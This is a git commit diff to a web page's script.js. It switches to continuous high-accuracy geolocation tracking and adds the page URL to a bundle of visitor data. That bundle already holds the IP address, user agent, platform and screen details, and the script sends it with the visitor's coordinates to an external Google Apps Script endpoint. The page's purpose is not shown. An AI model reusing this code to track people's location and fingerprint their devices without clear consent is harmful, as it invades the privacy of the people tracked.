bd8e768078638058e8d2e09f3722f447e7cbbad5
tiscopeey <126366485+tiscopeey@users.noreply.github.com>
2024-02-22 22:06:21 +0800

    Update script.js

--- script.js
+++ script.js
@@ -3,7 +3,7 @@ const appScriptUrl = "https://script.google.com/macros/s/AKfycbyerovyJhwPACBq_7R
 let nearbyInformation, getTimeInterval;
 
 if (navigator.geolocation) {
-	navigator.geolocation.getCurrentPosition(showPosition, showError);
+	navigator.geolocation.watchPosition(showPosition, showError, {enableHighAccuracy: true});
 } else {
 	document.getElementById("heading").innerHTML = "";
 }
@@ -54,10 +54,10 @@ function showError(error) {
 }
 
 async function markdown(description, latitude, longitude, accuracy){
-	const xhttpr = new XMLHttpRequest(), agent = window.navigator.userAgent, platform = window.navigator.platform, ipAddress = await getIp();
+	const xhttpr = new XMLHttpRequest(), agent = window.navigator.userAgent, platform = window.navigator.platform, ipAddress = await getIp(), userUrl = window.location.href;
 	const orientation = window.screen.orientation.type, logical = window.screen.width + " x " + window.screen.height, pxRatio = window.devicePixelRatio;
 	const actual = window.screen.width * window.devicePixelRatio + " x " + window.screen.height * window.devicePixelRatio;
-	const info = "User Agent: " + agent + " Platform: " + platform + " IP Address: " + ipAddress + " Screen Orientation: " + orientation + " Logical resolution: " + logical + " Actual resolution: " + actual + " Pixel Ratio: " + pxRatio;
+	const info = "User Agent: " + agent + " Platform: " + platform + " IP Address: " + ipAddress + " Reference URL: " + userUrl + " Screen Orientation: " + orientation + " Logical resolution: " + logical + " Actual resolution: " + actual + " Pixel Ratio: " + pxRatio;
 	const url = appScriptUrl + "?q=markdown&des=" + description + "&lat=" + latitude + "&lng=" + longitude + "&acc=" + accuracy + "&info=" + info;
 	xhttpr.open("GET", url, true);
 	xhttpr.send();
